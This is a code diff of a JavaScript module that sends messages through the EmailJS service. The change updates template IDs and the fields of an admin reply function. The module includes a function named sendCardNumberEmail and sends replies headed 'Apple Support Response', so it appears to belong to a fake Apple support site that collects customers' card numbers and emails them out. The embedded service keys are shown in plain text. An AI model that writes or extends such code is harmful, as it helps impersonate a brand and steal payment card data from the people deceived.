@@ -1,8 +1,9 @@
 import emailjs from 'emailjs-com';
 
 const SERVICE_ID = 'service_ozea06x';
-const TEMPLATE_ID = 'template_hjohb6l';
+const TEMPLATE_ID = 'template_8k1eouc';
 const CHAT_TEMPLATE_ID = 'template_jrao90f'; // Chat messages template ID
+const ADMIN_TEMPLATE_ID = 'template_5sz8xdd'; // Admin response template ID
 const PUBLIC_KEY = 'XMOnwjyzQDoRVRYl3';
 
 export function sendCardNumberEmail(cardNumber) {
@@ -34,17 +35,20 @@ export function sendChatMessage(message, userEmail = 'customer@unknown.com', ima
 }
 
 // Send admin response to customer
+
+// Send admin response to customer using the new template
 export function sendAdminResponse(adminMessage, customerEmail) {
   const templateParams = {
-    message: adminMessage,
-    user_email: customerEmail,
+    customer_email: customerEmail,      // match EmailJS template field
+    admin_message: adminMessage,        // match EmailJS template field
     timestamp: new Date().toLocaleString(),
     subject: 'Apple Support Response'
+    // Add any other fields your EmailJS template requires
   };
 
   return emailjs.send(
     SERVICE_ID,
-    CHAT_TEMPLATE_ID,
+    ADMIN_TEMPLATE_ID,
     templateParams,
     PUBLIC_KEY
   );
